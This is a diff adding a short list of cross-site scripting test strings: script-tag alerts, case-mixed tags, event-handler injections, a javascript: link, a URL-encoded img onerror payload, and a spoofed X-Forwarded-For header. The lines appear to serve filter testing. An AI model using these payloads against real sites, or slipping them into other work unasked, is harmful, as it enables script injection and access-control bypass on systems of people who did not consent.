@@ -1,0 +1,10 @@
+<script>alert('xss')</script>
+<script>alert('xss')</script>
+<script>alert(9)</script>
+<scRIPT>alert(9)</Script>
+" onmouseover='alert(9)'
+" OonNmouseover='alert(9)'
+<a HrEf=javascrIpt:alert('xss') > xss</a>
+"type="text" onclick="alert('xss')
+<img%0asrc="111"%0aonerror=alert('xss')%0a>
+X-FORWORDED-FOR:127.0.0.1
